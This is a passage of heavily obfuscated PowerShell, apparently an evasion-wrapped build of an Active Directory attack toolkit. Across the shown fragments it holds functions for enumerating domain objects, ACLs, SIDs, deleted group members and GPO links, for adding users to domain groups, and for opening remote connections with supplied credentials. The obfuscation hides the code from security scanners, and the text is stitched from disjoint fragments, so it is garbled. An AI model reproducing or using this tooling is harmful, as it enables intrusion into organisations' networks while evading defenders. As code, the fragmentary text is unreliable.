    (&(Z3b{0}{1}Z3b-f S5zfunS5z,S5zcS5z) (Z3b{0}{1}Z3b-f S5znetaS5z,S5zpi32S5z) (Z3b{1}{3}{2}{0}Z3b-f S5zeEnumS5z,S5zNeS5z,S5zSharS5z,S5ztS5z) ([Int]) @([String], [Int],   YoV{6IJKRIJKK25P}.(Z3b{2}{1}{0}Z3b-fS5zeS5z,S5zkeByRefTypS5z,S5zMaS5z).Invoke(), [Int],   YoV{R26IJK9F}.(Z3b{4}{1}{3}{2}{0}Z3b-fS5zeS5z,S5zkeByRS5z,S5zpS5z,S5zefTyS5z,S5zMaS5z).Invoke(),   (&(Z3b{1}{2}{0}Z3b -f S5zITEMS5z,S5zgeTS5z,S5z-S5z)  (S5zVARS5z+S5zIAbS5z+S5zle:r269fS5z)).Z3bVAIJKlueZ3b.(Z3b{0}{2}{3}{1}Z3b-fS5zMaS5z,S5zeS5z,S5zkeByRefS5z,S5zTypS5z).Invoke(),   (&(Z3b{1}{2}{0}Z3b-fS5zLES5z,S5zVAriaS5z,S5zBS5z) R269F).Z3bvaIJKlUEZ3b.(Z3b{0}{3}{2}{1}{4}Z3b -f S5zMaS5z,S5zpS5z,S5zTyS5z,S5zkeByRefS5z,S',' -f S5ztiesS5z,S5zroperS5z,S5zPS5z) = (Z3b{9}{7}{8}{14}{12}{2}{1}{0}{5}{10}{4}{13}{6}{11}{3}Z3b-fS5zr,diS5z,S5zptoS5z,S5ztydescriS5z,S5zdS5z,S5zguishS5z,S5zsS5z,S5znamS5z,S5znamS5z,S5ze,ntS5z,S5zsamaccountS5z,S5ztinS5z,S5ze,objectsiS5z,S5zuriS5z,S5zedS5z,S5zsecS5z)
        }

        if (YoV{pIJKSboUNIJKdPIJKARamETeRS}[(Z3b{1}{0}Z3b -f S5zlS5z,S5zSacS5z)]) {
            YoV{SEARchIJKeRARgIJKUMIJKEIJKNts}[(Z3b{1}{3}{0}{2}Z3b-fS5zyMasS5z,S5zSecS5z,S5zksS5z,S5zuritS5z)] = (Z3b{0}{1}Z3b -f S5zSaS5z,S5zclS5z)
        }
        else {
            YoV{SIJKEAIJKRCIJKheRA',' else {
            if (YoV{pSIJKBIJKouIJKNIJKDPaRAmeIJKTeRS}[(Z3b{1}{2}{0}Z3b -fS5zalS5z,S5zCS5z,S5zredentiS5z)]) {
                &(Z3b{1}{2}{0}{3}Z3b -fS5zeS5z,S5zWriteS5z,S5z-VS5z,S5zrboseS5z) (Z3b{7}{6}{5}{10}{0}{11}{2}{3}{4}{1}{8}{9}Z3b -f S5z Using alS5z,S5zdS5z,S5zrnaS5z,S5zte crS5z,S5zeS5z,S5zextS5z,S5zGet-PrincipalContS5z,S5z[S5z,S5zeS5z,S5zntialsS5z,S5z]S5z,S5zteS5z)
                YoV{DoIJKMainIJKNIJKAME} = &(Z3b{1}{0}{2}Z3b-fS5zaiS5z,S5zGet-DomS5z,S5znS5z) JGO &(Z3b{1}{0}{2}Z3b -fS5zObjS5z,S5zSelect-S5z,S5zectS5z) -ExpandProperty (Z3b{0}{1}Z3b -f S5zNamS5z,S5zeS5z)
                YoV{coNtIJKExt} = &(Z3b{0}{2}{1}Z3b -f S5zNew-ObS5z,S5ztS5z,S5zjecS5z) -TypeName (Z3b{4}{8}{7}{15}{3}{1}{2}{6}{0}{11}{14}{10}{13}{5}{9}{12}Z3b -f S5ztS5z,S5zccountS5z,S5zManagS5z,S5zServices.AS5z,S5zSysS5z,S5zlCoS5z,S5zemenS5z,S5zmS5z,S5zteS5z,S5zntexS5z,S5znciS5z,S5z.S5z,S5ztS5z,S5zpaS5z,S5zPriS5z,S5z.DirectoryS5z) -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Z3bdIJKOIJKMAiNZ3b, YoV{domIJKAiNnAIJKmE}, YoV{credeIJKNIJKTIIJKAl}.Z3buSeIJKRnAmeZ3b, YoV{CrIJKEDIJKENtIJKiaL}.(Z3b{1}{5}{0}{2}{4}{3}Z3b-fS5zNetworkS5z,S5zGS5z,S5zCreS5z,S5zalS5z,S5zdentiS5z,S5zetS5z).Invoke().Z3bPIJKAsSIJKWoRdZ3b)
            }
            else {
                YoV{CoIJKNIJKTEXT} = &(Z3b{0}{1}{2}Z3b-f S5zNS5z,S5zew-OS5z,S5zbjectS5z) -TypeName (Z3b{2}{4}{7}{1}{9}{3}{14}{5}{13}{0}{10}{8}{12}{11}{6}Z3b-f S5znS5z,S5zryServicS5z,S5zSysS5z,S5zntManS5z,S5ztem.DirectS5z,S5zemS5z,S5zContextS5z,S5zoS5z,S5zrS5z,S5zes.AccouS5z,S5zt.PS5z,S5zlS5z,S5zincipaS5z,S5zeS5z,S5zagS5z) -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Z3bdOMIJKAiNZ3b)
         ',',S5z*OS5z)) -cRepLaceS5zOJWS5z,[ChAr]92)) -and (YoV{pIJKsBoUNDpIJKArAmIJKETers}[(Z3b{1}{0}{2}Z3b-fS5zeS5z,S5zCrS5z,S5zdentialS5z)])) {
                    YoV{hOSTIJKCOMIJKPutER} = (&(Z3b{0}{1}{2}Z3b-fS5zNewS5z,S5z-OS5z,S5zbjectS5z) (Z3b{3}{0}{2}{1}Z3b-fS5zmS5z,S5ziS5z,S5z.UrS5z,S5zSysteS5z)(YoV{tIJKAIJKRgIJKETPath})).Z3bhoIJKSTZ3b
                    if (-not YoV{MaIJKpPedcOMPuIJKTIJKEIJKRs}[YoV{HOSIJKTIJKCOmIJKputEr}]) {
                        
                        &(Z3b{2}{1}{0}{3}Z3b-f S5zteCS5z,S5zdd-RemoS5z,S5zAS5z,S5zonnectionS5z) -ComputerName YoV{HoIJKstComPIJKUTeR} -Credential YoV{crEIJKdIJKENIJKTial}
                        YoV{mAIJKppEdCIJKOmPUIJKTeRs}[YoV{HIJKOIJKstCIJKOIJKmPuTER}] = YoV{tIJKRue}
                    }
                }

                YoV{aIJKCL} = &(Z3b{1}{0}Z3b-f S5zAclS5z,S5zGet-S5z) -Path YoV{tAIJKRgEIJKTpIJKAtH}

                YoV{AIJKcl}.Z3bgIJKeIJKTAcIJKcESSRuLEsZ3b(YoV{tRIJKUe}, YoV{TIJKRue}, [System.Security.Principal.SecurityIdentifier]) JGO &(Z3b{3}{1}{4}{0}{2}Z3b -fS5zObjS5z,S5zaS5z,S5zectS5z,S5zForES5z,S5zch-S5z) {
                    YoV{sIJKid} = YoV{_}.Z3biDIJKeIJKNIJKTiTYREIJKFeReIJKNCeZ3b.Z3bvIJKAlUeZ3b
                    YoV{nIJKAMe} = &(Z3b{2}{3}{1}{0}Z3b-fS5zom-SIDS5z,S5zrtFrS5z,S5zConvS5z,S5zeS5z) -ObjectSID YoV{SIJKid} @ConvertArguments

                    YoV{oIJKUT} = &(Z3b{3}{0}{2}{1}Z3b-f S5z-S5z,S5zjectS5z,S5zObS5z,S5zNewS5z) (Z3b{2}{0}{1}Z3b -f S5zObjecS5z,S5ztS5z,S5zPSS5z)
                    YoV{oIJKUt} JGO &(Z3b{2}{1}{0}{3}Z3b-fS5zmbeS5z,S5zdd-MeS5z,S5zAS5z,S5zrS5z) (Z3b{1}{0}{2}{3}Z3b -f S5zotS5z','2}{1}Z3b -f S5zContS5z,S5znsS5z,S5zaiS5z).Invoke(S5z5rjS5z) ) {
                                    &(Z3b{0}{3}{1}{2}Z3b -f S5zNS5z,S5zObjecS5z,S5ztS5z,S5zew-S5z) -TypeName (Z3b{2}{0}{1}Z3b-f S5zSS5z,S5zObjectS5z,S5zPS5z) -Property @{(Z3b{0}{1}Z3b-fS5zNaS5z,S5zmeS5z)=YoV{pROperIJKTIJKiIJKeS}.Z3bnIJKAMEZ3b[0];(Z3b{0}{1}{2}{3}{4}Z3b-fS5zRemotS5z,S5zeServS5z,S5zeS5z,S5zrNS5z,S5zameS5z)=YoV{_}.(Z3b{0}{1}Z3b -fS5zsplS5z,S5zitS5z).Invoke(S5z5rjS5z)[2]}
                                }
                            }
                            catch {
                                &(Z3b{2}{0}{1}Z3b-f S5zrbS5z,S5zoseS5z,S5zWrite-VeS5z) (S5z[Get-S5z+S5zDomS5z+S5zaS5z+','dparameIJKTeRs}[(Z3b{1}{2}{0}Z3b-fS5ztityS5z,S5zIS5z,S5zdenS5z)]) {
            YoV{TaIJKRGEIJKTsidS} += &(Z3b{2}{1}{4}{0}{3}Z3b-fS5znS5z,S5ztS5z,S5zGeS5z,S5zObjectS5z,S5z-DomaiS5z) @CommonArguments -Identity YoV{iIJKdIJKeNTIIJKTY} JGO &(Z3b{0}{2}{1}{3}Z3b -fS5zSeleS5z,S5zObjecS5z,S5zct-S5z,S5ztS5z) -Expand (Z3b{3}{1}{2}{0}Z3b-f S5zidS5z,S5zectS5z,S5zsS5z,S5zobjS5z)
            YoV{tIJKAIJKRIJKGeTobIJKjeIJKctSid} = YoV{tIJKARIJKGETsIDS}
            if (-not YoV{taIJKRgeIJKTIJKSids}) {
                Throw (S5z[S5z+S5zGS5z+S5','teRS}[(Z3b{1}{0}{2}Z3b-f S5zpS5z,S5zProS5z,S5zertiesS5z)]) {
            
            YoV{PRIJKOpeIJKRIJKTIeSTOLoAd} = YoV{pRoPIJKeIJKRTIES}JGO &(Z3b{0}{1}{2}Z3b -fS5zForS5z,S5zES5z,S5zach-ObjectS5z) { YoV{_}.(Z3b{0}{1}Z3b-fS5zSS5z,S5zplitS5z).Invoke(S5z,S5z) }
            YoV{nIJKULl} = YoV{sEIJKArIJKchEr}.Z3bPropERTIESIJKTIJKOlOIJKAdZ3b.(Z3b{0}{1}{2}Z3b -f S5zAddRaS5z,S5zngS5z,S5zeS5z).Invoke((YoV{PIJKROPIJKerIJKTieIJKstOLIJKOAD}))
        }

        YoV{SeIJKARCHIJKER}
    }
}


function cIJKonVEIJKRt-IJKdNsIJKRecord {


    [OutputType({Z3b{0}{1}{10}{4}{6}{7}{9}{3}{11}{5}{8}{2}Z3b -f S5zSS5z,S5zystem.ManS5z,S5ztS5z,S5ztion.S5z,S5zment.S5z,S5zSCusS5z,S5zAutoS5z,S5zmS5z,S5ztomObjecS5z,S5zaS5z,S5zageS5z,S5zPS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSiTioN = 0, ManDaTory = YoV{TRIJKUE}, ValUEfrOMpIPeLIneByPRoPERtynaME = YoV{TIJKRuE})]
        [Byte[]]
        YoV{DIJKNSrEIJKcOrD}
    )

    BEGIN {
        function geT-NIJKAIJKME {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{1}{0}{4}{2}{3}{5}Z3b -f S5zSUseS5z,S5zPS5z,S5ztTypS5z,S5zeCorrecS5z,S5zOutpuS5z,S5ztlyS5z}, S5zS5z)]
            [CmdletBinding()]
            Param(
                [Byte[]]
                YoV{RIJKAW}
            )

            [Int]YoV{LEIJKNGIJKTh} = YoV{RIJKAW}[0]
            [Int]YoV{sEIJKGmeIJKNts} = YoV{RIJKAw}[1]
            [Int]YoV{iIJKNDIJKEX} =  2
            [String]YoV{NIJKAme}  = S5zS5z

            while (YoV{sIJKeIJKGmEntS}-- -gt 0)
            {
                [Int]YoV{sIJKEIJKGmIJKeNtLEnIJKgth} = YoV{rIJKAw}[YoV{inIJKdIJKeX}++]
                while (YoV{SIJKegMEnTLEIJKNIJKGth}-- -gt 0) {
                    YoV{nIJKAme} += [Char]YoV{RIJKAW}[YoV{inIJKdEx}++]
                }
                YoV{NIJKAMe} += Z3b.Z3b
            }
            YoV{NAIJKMe}
        }
    }

    PROCESS {
        
        YoV{RDaIJKTaIJKTyPe} =  YoV{aEPIJKsI}::(Z3b{1}{0}{2}Z3b-fS5zIS5z,S5zToUS5z,S5znt16S5z).Invoke(YoV{dnIJKSRIJKecORd}, 2)
        YoV{UPdatEDATIJKsIJKeRiIJKAl} =   (&(Z3b{1}{0}{3}{2}Z3b -fS5ztS5z,S5zgeS5z,S5ziABLES5','IJKBIJKOUNdPArIJKAMEtERs}[(Z3b{1}{0}{2}Z3b-fS5ztS5z,S5zIdenS5z,S5zityS5z)]) { YoV{seIJKARchIJKeRIJKArGIJKUmEnTS}[(Z3b{2}{0}{1}Z3b -fS5zentitS5z,S5zyS5z,S5zIdS5z)] = YoV{ideNIJKTIJKItY} }

        &(Z3b{4}{3}{1}{2}{0}Z3b -f S5ztS5z,S5z-DS5z,S5zomainObjecS5z,S5zetS5z,S5zGS5z) @SearcherArguments JGO &(Z3b{4}{0}{2}{3}{1}Z3b-f S5zach-S5z,S5zectS5z,S5zObS5z,S5zjS5z,S5zForES5z) {
            YoV{oBIJKJEcIJKTDN} = YoV{_}.Z3bProIJKPeIJKRtIJKIesZ3b[(Z3b{1}{0}{2}{3}Z3b -f S5zistinguS5z,S5zdS5z,S5zishedS5z,S5znameS5z)][0]
            ForEach(YoV{XIJKMLIJKNodE} in YoV{_}.Z3bPIJKRopEIJKRtieSZ3b[(Z3b{1}{0}{2}{6}{4}{5}{3}Z3b -f S5zdS5z,S5zmsS5z,S5zs-replvaS5z,S5zaS5z,S5ztS5z,S5zadatS5z,S5zluemeS5z)]) {
                YoV{tIJKEmIJKPOBjECT} = [xml]YoV{xIJKMLnIJKoDe} JGO &(Z3b{1}{0}{2}{3}Z3b-f S5z-S5z,S5zSelectS5z,S5zObS5z,S5zjectS5z) -ExpandProperty (Z3b{0}{4}{3}{5}{2}{1}Z3b-fS5zDS_S5z,S5zTAS5z,S5zDAS5z,S5z_VALUE_METAS5z,S5zREPLS5z,S5z_S5z) -ErrorAction (Z3b{4}{3}{1}{2}{0}Z3b-f S5znueS5z,S5ztS5z,S5ziS5z,S5zentlyConS5z,S5zSilS5z)
                if (YoV{tIJKeMpobJIJKEIJKcT}) {
                    if ((YoV{TEmpIJKoIJKBJIJKect}.Z3bpszATTIJKRIJKibutIJKEIJKNaMeZ3b -Match (Z3b{1}{0}Z3b-fS5zmberS5z,S5zmeS5z)) -and ((YoV{TIJKEMpobJIJKECt}.Z3bdwvErIJKsIIJKonZ3b % 2) -eq 0 )) {
                        YoV{OIJKUIJKTput} = &(Z3b{0}{2}{1}Z3b -f S5zNewS5z,S5zObjectS5z,S5z-S5z) (Z3b{1}{0}Z3b-f S5ztS5z,S5zPSObjecS5z)
                        YoV{OuIJKTpUT} JGO &(Z3b{1}{2}{0}{3}Z3b-f S5zmS5z,S5zAS5z,S5zdd-MeS5z,S5zberS5z) (Z3b{2}{0}{3}{1}Z3b -fS5zotePropeS5z,S5zyS5z,S5zNS5z,S5zrtS5z) (Z3b{1}{0}Z3b -fS5zNS5z,S5zGroupDS5z) YoV{ObJIJKEIJKctdn}
                        YoV{OIJKUTIJKpUT} JGO &(Z3b{0}{1}{2}Z3b-fS5zAS5z,S5zdd-MembeS5z,S5zrS5z) (Z3b{3}{1}{2}{0}Z3b -fS5zrtyS5z,S5zProS5z,S5zpeS5z,S5zNoteS5z) (Z3b{0}{2}{1}Z3b -fS5zMeS5z,S5zerDNS5z,S5zmbS5z) YoV{tIJKEMPoIJKBjECt}.Z3bpsIJKZObJectIJKDNZ3b
                        YoV{OIJKUtIJKpuT} JGO &(Z3b{3}{2}{0}{1}Z3b -fS5zembeS5z,S5zrS5z,S5z-MS5z,S5zAddS5z) (Z3b{1}{3}{0}{2}Z3b-f S5zopeS5z,S5zNoS5z,S5zrtyS5z,S5ztePrS5z) (Z3b{1}{2}{0}{4}{3}Z3b -f S5zeFS5z,S5zTS5z,S5zimS5z,S5zdS5z,S5zirstAddeS5z) YoV{tEIJKmpIJKOBject}.Z3bFtimecIJKRIJKeAIJKTEDZ3b
                        YoV{oIJKUTIJKPUt} JGO &(Z3b{1}{2}{0}Z3b -fS5zrS5z,S5zAdS5z,S5zd-MembeS5z) (Z3b{0}{1}{3}{2}Z3b -f S5zNotS5z,S5zeS5z,S5ztyS5z,S5zProperS5z) (Z3b{1}{2}{0}Z3b -f S5zeletedS5z,S5zTS5z,S5zimeDS5z) YoV{teMIJKPIJKobjIJKECt}.Z3bFTIMeDELIJKeIJKTIJKEdZ3b
                        YoV{OuIJKTPuT} JGO &(Z3b{0}{2}{1}Z3b -f S5zAdd-S5z,S5zerS5z,S5zMembS5z) (Z3b{2}{1}{3}{0}Z3b-fS5zropertyS5z,S5zoS5z,S5zNS5z,S5ztePS5z) (Z3b{3}{0}{6}{1}{4}{5}{2}Z3b-fS5zrigiS5z,S5ztS5z,S5zngeS5z,S5zLastOS5z,S5zingCS5z,S5zhaS5z,S5znaS5z) YoV{TEMpoIJKBJIJKECT}.Z3bfIJKTIMIJKELaStorIGIJKIIJKNATInGcHaIJKNIJKGEZ3b
                        YoV{OUIJKTIJKPUT} JGO &(Z3b{2}{1}{0}Z3b-f S5zrS5z,S5zdd-MembeS5z,S5zAS5z) (Z3b{3}{0}{1}{2}Z3b -f S5zrS5z,S5zopertS5z,S5zyS5z,S5zNotePS5z) (Z3b{0}{2}{1}Z3b-fS5zTiS5z,S5zddedS5z,S5zmesAS5z) (YoV{temIJKpoBIJKJeCt}.Z3bDwverSIJKiIJKOnZ3b / 2)
                        YoV{OIJKUIJKTPut} JGO &(Z3b{1}{2}{0}Z3b-f S5zberS5z,S5zAdd-S5z,S5zMemS5z) (Z3b{1}{0}{3}{2}Z3b-fS5ztS5z,S5zNoS5z,S5zopertyS5z,S5zePrS5z) (Z3b{1}{3}{0}{2}Z3b -fS5zriginatinS5z,S5zLasS5z,S5zgDsaDNS5z,S5ztOS5z) YoV{tIJKEmPIJKOBJECT}.Z3bpSZLaIJKSIJKTIJKoriGInATinIJKGDSaDnZ3b
                        YoV{outIJKpUt}.Z3bPIJKsIJKObjEctZ3b.Z3bTIJKYPENaIJKmeSZ3b.(Z3b{2}{0}{1}Z3b -fS5zrS5z,S5ztS5z,S5zInseS5z).Invoke(0, (Z3b{8}{2}{5}{6}{1}{4}{7}{0}{3}Z3b -fS5zerDeleS5z,S5zmS5z,S5zowS5z,S5ztedS5z,S5zainGrouS5z,S5zerVS5z,S5ziew.DoS5z,S5zpMembS5z,S5zPS5z))
                        YoV{OUtIJKpUT}
                    }
                }
                else {
                    &(Z3b{3}{0}{2}{1}Z3b-f S5zriteS5z,S5zerboseS5z,S5z-VS5z,S5zWS5z) (S5z[S5z+S5zGet-DoS5z+S5zmainGroupMeS5z+S5zmbeS5z+S5zrDeletS5z+S5zed] S5z+S5zES5z+S5zrror S5z+S5zrS5z+S5zetriS5z+S5zeving S5z+((S5zIMS5z+S5zNmsds-replvaS5z+S5zluS5z+S5zemeS5z+S5ztaS5z+S5zdaS5z+S5ztaIMN S5z)-ReplAce  S5zIMNS5z,[ChAR]39)+S5zfS5z+S5zor S5z+Z3bS5zYoVObjectDNS5zZ3b)
                }
            }
        }
    }
}


function AdD-DIJKoIJKMIJKAingROuPmEMbEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{0}{3}{1}{2}Z3b-fS5zPSS5z,S5zlS5z,S5zdProcessS5z,S5zShouS5z}, S5zS5z)]
    [CmdletBinding()]
    Param(
        [Parameter(PoSITioN = 0, MaNdaToRY = YoV{TIJKRUE})]
        [Alias({Z3b{1}{0}{2}Z3b -f S5zNS5z,S5zGroupS5z,S5zameS5z}, {Z3b{0}{2}{1}Z3b -fS5zGroupIS5z,S5ztyS5z,S5zdentiS5z})]
        [String]
        YoV{iDIJKeNtIJKitY},

        [Parameter(mAndATORY = YoV{tRIJKUE}, vaLUEfROMPiPelInE = YoV{TIJKRUe}, vALuEfrOmPiPeLInEbypROperTYnaME = YoV{tRIJKUE})]
        [Alias({Z3b{2}{1}{4}{0}{3}Z3b -f S5zdS5z,S5zembeS5z,S5zMS5z,S5zentityS5z,S5zrIS5z}, {Z3b{1}{0}Z3b-f S5zmberS5z,S5zMeS5z}, {Z3b{0}{5}{4}{1}{3}{2}Z3b-f S5zDistiS5z,S5zdS5z,S5zeS5z,S5zNamS5z,S5zuisheS5z,S5zngS5z})]
        [String[]]
        YoV{MeIJKMIJKBeRs},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{dOmIJKAIJKin},

        [Management.Automation.PSCredential]
        [Management.','} in YoV{cLAsSIJKNIJKAmE}) {
                    YoV{fOReIJKSTOIJKBJEIJKct}.Z3bScIJKheIJKMAZ3b.(Z3b{1}{0}{2}Z3b -fS5zsS5z,S5zFindClaS5z,S5zsS5z).Invoke(YoV{tARIJKGetIJKclASS})
                }
            }','RgIJKUmEIJKNTs}[(Z3b{1}{0}Z3b -f S5zrS5z,S5zServeS5z)] = YoV{sEIJKRVIJKer} }
        if (YoV{pIJKsBoIJKUNdparamEIJKTeIJKRs}[(Z3b{1}{3}{0}{2}Z3b -fS5ztS5z,S5zResuS5z,S5zPageSizeS5z,S5zlS5z)]) { YoV{dIJKoIJKmaINGIJKUIJKIdMaPaRIJKGuMIJKentS}[(Z3b{1}{4}{0}{3}{2}Z3b -fS5zPaS5z,S5zResuS5z,S5zeS5z,S5zgeSizS5z,S5zltS5z)] = YoV{resIJKUIJKLtpIJKAGesiIJKzE} }
        if (YoV{pSbIJKouNdpArAIJKmEIJKTEIJKRS}[(Z3b{2}{1}{3}{0}Z3b -f S5ztS5z,S5zrTS5z,S5zServeS5z,S5zimeLimiS5z)]) { YoV{DOIJKmaInGuIDmAPAIJKRGUmEIJKNIJKTs}[(Z3b{2}{1}{0}Z3b-f S5zimitS5','    [Alias({Z3b{0}{2}{1}Z3b-fS5zDNSS5z,S5ztNameS5z,S5zHosS5z})]
        [String[]]
        YoV{COmpIJKUTIJKeRIJKNaIJKMe},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{dIJKoIJKMAiN},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{CIJKomPIJKUIJKTeRDomIJKAIn},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{ComPuIJKTERLIJKDaPIJKFIlTIJKEr},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{CoMIJKPIJKUTEIJKRsEIJKArchbIJKAse},

        [Alias({Z3b{3}{0}{1}{2}Z3b-f S5zsS5z,S5ztraS5z,S5zinedS5z,S5zUnconS5z})]
        [Switch]
        YoV{CoMPIJKUTERIJKUnIJKCIJKOnSIJKTRaIJKIned},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{2}{0}{3}Z3b -f S5ztS5z,S5zOperatinS5z,S5zgSysS5z,S5zemS5z})]
        [String]
        YoV{CoMPUTIJKeIJKROPERaTIJKiNIJKgSYsTem},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{2}{1}Z3b -fS5zSeS5z,S5zicePackS5z,S5zrvS5z})]
        [String]
        YoV{CIJKOMIJKPUtIJKeIJKRIJKsErVicEPAcK},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{2}{0}Z3b -f S5zeNameS5z,S5zSiS5z,S5ztS5z})]
        [String]
        YoV{COmpUteIJKRSIIJKTeIJKNAIJKmE},

    ','IJKer}.(Z3b{1}{0}Z3b -f S5zrimS5z,S5zTS5z).Invoke() -ne S5zS5z) -and YoV{UIJKsIJKERDIJKomAIn}) {
                    YoV{bIJKINDIJKSErVIJKER} = Z3bYoV(YoVENV:LOGONSERVER -replace S5z5rj5rjS5z,S5zS5z).YoVUserDomainZ3b
                }
            }
        }
        elseif (YoV{psIJKBOUnDpaIJKRaIJKmeTIJKErS}[(Z3b{2}{0}{1}Z3b -f S5zedentiS5z,S5zalS5z,S5zCrS5z)]) {
            
            YoV{doIJKmIJKAIIJKNObJIJKEct} = &(Z3b{1}{0}{2}Z3b-fS5zt-DS5z,S5zGeS5z,S5zomainS5z) -Credential YoV{cRIJKeIJKdEnTIIJKAL}
            YoV{BIJKINdserVIJKer} = (YoV{DOMaIIJKNIJKoBjIJKeCT}.Z3bpdIJKCIJKROleOIJKWNerZ3b).Z3bnaIJKmeZ3b
            YoV{TaIJKRIJKGetIJKdoIJKmAIn} = YoV{doMIJKAinOIJKBJeCT}.Z3bNIJKAMeZ3b
        }
        elseif (YoV{eIJKNVIJK:USeRdNsdIJKoMaiN} -and (YoV{eNIJKV:UIJKSerIJKdNSdOMAIJKIn}.(Z3b{0}{1}Z3b -fS5zTS5z,S5zrimS5z).Invoke() -ne S5zS5z)) {
            
            YoV{taIJKRGetDIJKOmIJKAiN} = YoV{EnV:IJKUIJKseIJKRDnSDOMIJKAin}
            if (YoV{ENIJKV:IJKLIJKoIJKgoNSeRvER} -and (YoV{ENV:LOgOnsIJKeIJKRIJKVEr}.(Z3b{1}{0}Z3b -fS5zrimS5z,S5zTS5z).Invoke() -ne S5zS5z) -and YoV{TARgETIJKdoIJKMAIN}) {
                YoV{BIJKiIJKNDSEIJKRVER} = Z3bYoV(YoVENV:LOGONSERVER -replace S5z5rj5','SearcheS5z,S5zGet-DoS5z) @SearcherArguments

        YoV{dIJKoMIJKAINguIJKIdMIJKAPIJKArGUmIJKeNts} = @{}
        if (YoV{pIJKSBoIJKUNIJKDPArAMEIJKTERs}[(Z3b{1}{2}{0}Z3b -fS5zinS5z,S5zDS5z,S5zomaS5z)]) { YoV{DOMaIJKinGuIIJKdIJKMapaRIJKGUMenTS}[(Z3b{1}{0}Z3b-fS5zmainS5z,S5zDoS5z)] = YoV{doIJKmAIN} }
        if (YoV{PSBOUNIJKdIJKPAIJKRaMEteIJKRs}[(Z3b{2}{1}{0}Z3b-fS5zrverS5z,S5zeS5z,S5zSS5z)]) { YoV{DOMAIJKINIJKGuIJKIDMapAIJK','3bLE:Z3b+Z3b5mYZ3b)).Z3bvALIJKUeZ3b::Z3baIJKllZ3b

        if (YoV{pSbouNdpaIJKRAMetIJKeIJKRs}[(Z3b{2}{0}{3}{1}Z3b-fS5zverTimS5z,S5zmitS5z,S5zSerS5z,S5zeLiS5z)]) {
            YoV{SeaRIJKCIJKher}.Z3bseIJKRVEIJKRIJKTimELimIJKItZ3b = YoV{SErvIJKeIJKRTIJKimElIMIT}
        }

        if (YoV{PsIJKBoIJKUndPaIJKRIJKAMEIJKTERS}[(Z3b{2}{1}{0}Z3b-fS5zneS5z,S5zombstoS5z,S5zTS5z)]) {
            YoV{SEarCIJKhIJKER}.Z3bTOIJKMBsTIJKOIJKNeZ3b = YoV{tIJKRue}
        }

        if (YoV{PSboIJKUNDPIJKArAmIJKeIJKTeIJKRS}[(Z3b{0}{1}{2}Z3b -f S5zLS5z,S5zDAS5z,S5zPFilterS5z)]) {
            YoV{searIJKCIJKheR}.Z3bfIlIJKTeRZ3b = YoV{LDapFIJKiLTIJKer}
        }

        if (YoV{pIJKsbOuIJKNdpArAmIJKetIJKeRs}[(Z3b{1}{3}{0}{2}Z3b -f S5zcurity','CtS5z,S5z.emiS5z,S5zPS5z,S5zReFLES5z,S5ziOnS5z,S5zCOdESS5z,S5zT.OS5z))  ;  &(Z3b{1}{0}{3}{2}Z3b-f S5zriabS5z,S5zSEt-VAS5z,S5zES5z,S5zLS5z) 81LbKs ([TypE](Z3b{0}{1}Z3b-FS5zIS5z,S5zo.pATHS5z) ); &(Z3b{0}{1}{2}Z3b -f S5zseTS5z,S5z-ItS5z,S5zEmS5z) (S5zvAriS5z+S5zaBlS5z+S5ze:S5z+S5z2zS5z+S5zF5S5z)  ( [TyPE](Z3b{0}{1}{3}{2}Z3b-FS5zSYstS5z,S5zeS5z,S5zLES5z,S5zM.io.fiS5z)) ;  &(Z3b{2}{0}{3}{1}Z3b -fS5zRIaS5z,S5zeS5z,S5zset-vaS5z,S5zBLS5z) M1ZJL2  ([TypE](Z3b{2}{4}{3}{0}{1}Z3b-fS5zIlES5z,S5zMoDES5z,S5zsYStES5z,S5ziO.FS5z,S5zm.S5z)); YoV{S3ZIJKTEm} = [TYPe](Z3b{1}{3}{0}{2}Z3b-FS5zIS5z,S5zsYStemS5z,S5zleAccEssS5z,S5z.iO.FS5z) ; &(Z3b{1}{2}{0}Z3b-fS5zMS5z,S5zSS5z,S5zeT-iteS5z) VArIablE:KVX ([type](Z3b{0}{1}{2}Z3b -FS5zIoS5z,S5z.FIS5z,S5zleShAReS5z));  &(S5zsVS5z)  iVGOT  (  [tYpe](Z3b{0}{1}Z3b-f S5zNeT.S5z,S5zdnSS5z));    &(S5zSvS5z) (Z3bM27Z3b+Z3bB5','}Z3b -fS5zTS5z,S5zoIS5z,S5znt64S5z).Invoke()
                            YoV{nIJKEIJKWIntPtR2} = &(Z3b{2}{0}{1}{3}Z3b-fS5zw-S5z,S5zObjS5z,S5zNeS5z,S5zectS5z) (Z3b{1}{0}{2}Z3b-fS5zeS5z,S5zSystS5z,S5zm.IntptrS5z) -ArgumentList YoV{offIJKsET2}
                            YoV{iIJKNFo2} = YoV{nIJKeIJKWINtIJKPTr2} -as YoV{WTSIJK_cIJKLiIJKeIJKNT_ADDreIJKSs}

       ','                                YoV{_}.Z3bGIJKPIJKlINKZ3b.Z3bsIJKPLitZ3b(S5z][S5z) JGO &(Z3b{3}{0}{2}{1}Z3b-fS5zrS5z,S5zch-ObjectS5z,S5zEaS5z,S5zFoS5z) {
                                    if (YoV{_}.(Z3b{2}{0}{1}Z3b-fS5zwitS5z,S5zhS5z,S5zstartsS5z).Invoke((Z3b{1}{0}Z3b -f S5zPS5z,S5zLDAS5z))) {
                                        YoV{PArIJKTS} = YoV{_}.(Z3b{1}{0}Z3b-fS5zitS5z,S5zsplS5z).Invoke(S5z;S5z)
                                        YoV{gPIJKODN} = YoV{pIJKArIJKTs}[0]
                                        YoV{ENFIJKoRcIJKEd} = YoV{PARIJKTs}[1]

                                        if (YoV{InheRITIJKAIJKNIJKCEDisaIJKBLIJKED}) {
                                            
                                            
                                            if (YoV{ENIJKFoRIJKCEd} -eq 2) {
                                                YoV{gpIJKODN}
                                            }
                                        }
                                        else {
                                            
                                            YoV{gIJKpoIJKDn}
                                        }
                                    }
                                }
